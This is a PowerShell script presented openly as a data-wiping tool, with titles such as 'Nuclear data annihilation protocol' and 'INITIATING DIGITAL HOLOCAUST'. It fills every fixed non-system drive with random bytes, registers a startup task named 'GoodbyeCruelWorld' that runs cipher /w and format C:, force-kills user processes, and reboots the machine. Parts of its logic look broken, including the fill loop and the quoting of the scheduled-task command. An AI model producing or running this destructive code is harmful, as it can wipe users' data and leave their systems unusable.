<# 
.SYNOPSIS
[Assumes admin context] Nuclear data annihilation protocol
#>

function Invoke-TotalErase {
    param([string]$drive)
    $wipeFile = "\\?\$($drive):\FINAL_TRANSMISSION.dat"
    $buffer = New-Object byte[] (1MB)
    
    try {
        $stream = [System.IO.File]::OpenWrite($wipeFile)
        while ($true) {
            [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($buffer)
            $stream.Write($buffer, 0, $buffer.Length)
            Write-Host "🔥 [$drive] $(($stream.Length/1GB).ToString('N2')) GB vaporized"
        }
    } catch [System.IO.IOException] {
        # Drive filled
    } finally {
        if ($stream) { $stream.Close() }
        Remove-Item $wipeFile -Force -ErrorAction SilentlyContinue
    }
}

# ---------------------------
# EXECUTION FLOW
# ---------------------------
Write-Host "=== INITIATING DIGITAL HOLOCAUST ==="

$drives = Get-Partition | Where-Object { 
    $_.DriveLetter -and 
    (Get-Volume -DriveLetter $_.DriveLetter).DriveType -eq 'Fixed'
} | Select-Object -ExpandProperty DriveLetter

foreach ($d in $drives) {
    if ($d -eq 'C') { continue }  # Handle C: last
    Invoke-TotalErase -drive $d
}

# ---------------------------
# SYSTEM DRIVE FINALE
# ---------------------------
if ($drives -contains 'C') {
    Write-Host "💀 Scheduling C: drive's funeral..."
    $scriptBlock = {
        timeout /t 3 > nul
        cipher /w:C:\ > nul
        format C: /FS:NTFS /P:3 /Q /Y > nul
    }
    
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument "/c `"$scriptBlock`""
    Register-ScheduledTask -TaskName "GoodbyeCruelWorld" -Trigger $trigger -Action $action -Force > nul
    
    # Kill all non-essential processes
    Get-Process | Where-Object { $_.SessionId -ne 0 } | Stop-Process -Force
    
    # Final curtain
    Restart-Computer -Force
}